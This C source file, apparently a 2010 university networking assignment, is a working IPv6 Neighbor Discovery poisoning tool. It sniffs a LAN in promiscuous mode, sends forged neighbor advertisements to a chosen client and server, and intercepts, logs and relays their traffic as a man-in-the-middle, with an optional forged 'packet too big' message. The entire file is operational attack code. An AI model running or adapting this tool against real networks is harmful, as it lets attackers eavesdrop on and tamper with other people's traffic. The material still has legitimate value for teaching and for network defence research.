/******************************************************************
 * Data : 30.11.2010
 * Disciplina   : Redes - PUCRS
 * Professora	: Ana Benso
 *
 * Autores  : Cristiano Bolla Fernandes
 *          : Benito Michelon
 *****************************************************************/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <pthread.h>
#include <signal.h>
#include <getopt.h>

#include <sys/socket.h>
#include <linux/if_packet.h>
#include <arpa/inet.h>

#include <netinet/if_ether.h>
#include <netinet/ip6.h>
#include <netinet/icmp6.h>
#include <netinet/tcp.h>
#include <netinet/ether.h>

#include <device.h>
#include <packets.h>
#include <communication.h>
#include <log.h>

#define DEBUG 0

static int sniff, opt_verbose, opt_pkt2big;
char *logfile;
pthread_t pid0;


static void termination_handler() {
	printf("\nFree everything\n");

	close(sniff);
	free(cvictim);

	exit(0);
}

static void *poison(void *destination) {
	struct victim *dst = (struct victim *)destination;
	char *pkt1, *pkt2;
	char addr[INET6_ADDRSTRLEN];

	if (!victim_info_complete(dst) || !victim_info_complete(&svictim)) {
		printf("Victim not loaded correctly.\n");
		pthread_exit(NULL);
	}

	dst->poisoned = 1;
	printf("Starting Client and Server poisoning\n");

	inet_ntop(AF_INET6, &dst->ipv6, addr, INET6_ADDRSTRLEN);
	printf("Poisoning client: %s\n", addr);
	memset(addr, 0, INET6_ADDRSTRLEN);
	inet_ntop(AF_INET6, &svictim.ipv6, addr, INET6_ADDRSTRLEN);
	printf("Poisoning server: %s\n\n", addr);

	pkt1 = alloc_ndadvert(&svictim, dst);
	pkt2 = alloc_ndadvert(dst, &svictim);

	while (1) {
		/* Poison client */
		send_packet(pkt1);
		/* Poison server */
		send_packet(pkt2);
		sleep(5);
	}
	/* FIXME: Memleaks */
	free(pkt1);
	free(pkt2);
	pthread_exit(NULL);
}

static void get_victims(char *packet) {
	struct ethhdr *eth;
	struct ip6_hdr *ip6;
	struct icmp6_hdr *icmpv6;
	struct nd_neighbor_solicit *nd;

	eth = (struct ethhdr *)packet;
	ip6 = (struct ip6_hdr *)((char *)eth + sizeof(struct ethhdr));

	if (ip6->ip6_nxt == IPPROTO_ICMPV6) {
		icmpv6 = (struct icmp6_hdr *)((char *)ip6 + sizeof(struct ip6_hdr));

		if (icmpv6->icmp6_type == ND_NEIGHBOR_ADVERT) {
			if (memcmp(&svictim.hwaddr, &eth->h_source, ETH_ALEN) != 0) {
				memcpy(&(svictim.hwaddr), &(eth->h_source), ETH_ALEN);
				printf("Gotcha: %s\n", ether_ntoa(&svictim.hwaddr));
			}
		} else if (icmpv6->icmp6_type == ND_NEIGHBOR_SOLICIT) {
			nd = (struct nd_neighbor_solicit *)icmpv6;
			if (!memcmp(&nd->nd_ns_target, &svictim.ipv6, sizeof(struct in6_addr))) {
				if (!victim_info_complete(cvictim))
					populate_cvictim(packet);
				if (!cvictim->poisoned) {
					pthread_create(&pid0, NULL, poison, cvictim) ;
				}
			}
		}
	}
}

static void packet_action(char *packet) {
	struct ethhdr *eth;
	struct ip6_hdr *ip6;
	char *pkt, timestamp[10];
	time_t tt;
	struct tm *t;

	tt = time(NULL);
	t = localtime(&tt);
	strftime(timestamp, sizeof(timestamp), "%T", t);

	eth = (struct ethhdr *)packet;
	ip6 = (struct ip6_hdr *)((char *)eth + sizeof(struct ethhdr));

	if (memcmp(&(eth->h_dest), &(device.hwaddr), ETH_ALEN) == 0) {
		if (!memcmp(&(ip6->ip6_dst), &(svictim.ipv6), sizeof(struct in6_addr))) {
			printf("[%s] Packet hijacked (client => server)\n", timestamp);

			if (opt_verbose)
				debug_packet(packet);
			if (logfile)
				log_packet(packet, logfile);

			fake_packet(packet, &svictim);
			send_packet(packet);
		} else if (!memcmp(&(ip6->ip6_src), &(svictim.ipv6), sizeof(struct in6_addr))) {
			if (!memcmp(&(ip6->ip6_dst), &(cvictim->ipv6), sizeof(struct in6_addr))) {
				printf("[%s] Packet hijacked (server => client)\n", timestamp);

				if (opt_verbose)
					debug_packet(packet);
				if (logfile)
					log_packet(packet, logfile);

				fake_packet(packet, cvictim);
				send_packet(packet);
				if (opt_pkt2big) {
					pkt = alloc_pkt2big(cvictim, &svictim, ip6);
					send_packet(pkt);
					if (pkt)
						free(pkt);
				}
			}
		}
	}
}

static void usage(const char *name) {
	printf("Usage: %s --iface <interface> <victim's address>\n" \
			"\t--log <logfiel.pcap> \tLog hijacked packets in pcap file\n" \
			"\t--verbose \t\tVerbose\n" \
			"\t--pkt2big \t\tSend \"packet too big\" to attacked server\n", name);
}

int main(int argc, char **argv) {
	struct sockaddr_ll packet_info;
	struct sigaction saction;
	char *iface = NULL, *address = NULL;
	int packet_info_size = sizeof(packet_info);
	int len, c, option_index;
	char packet_buffer[2048];
	static struct option long_options[] = {
		{"verbose", no_argument, 0, 'v'},
		{"pkt2big", no_argument, 0, 'p'},
		{"iface", required_argument, 0, 'i'},
		{"log", required_argument, 0, 'l'},
		{0, 0, 0, 0}
	};

	/* Set up the structure to specify the new action. */
	saction.sa_handler = termination_handler;
	sigemptyset(&saction.sa_mask);
	saction.sa_flags = 0;

	sigaction(SIGINT, &saction, NULL);

	option_index = 0;
	logfile = NULL;

	while ((c = getopt_long (argc, argv, "vpl:i:", long_options, &option_index)) != -1) {
		switch (c) {
			case 'p':
				opt_pkt2big = 1;
				break;
			case 'v':
				opt_verbose = 1;
				break;
			case 'l':
				logfile = optarg;
				break;
			case 'i':
				iface = optarg;
				break;
			case '?':
				usage(argv[0]);
				return 1;
			default:
				abort();
		}
	}

	address = argv[optind];

	if (!address || !iface) {
		usage(argv[0]);
		return 0;
	}

	load_device_info(iface);
	dump_device_info();

	sniff = get_promisc_socket(device.name);
	init_svictim(address);
	init_cvictim();

	while ((len = recvfrom(sniff, packet_buffer, 2048, 0,
			(struct sockaddr*)&packet_info,
			(socklen_t *)&packet_info_size)) >= 0) {

		if (!victim_info_complete(&svictim) || !victim_info_complete(cvictim))
			get_victims(packet_buffer);
		else
			packet_action(packet_buffer);
	}

	return 0;
}
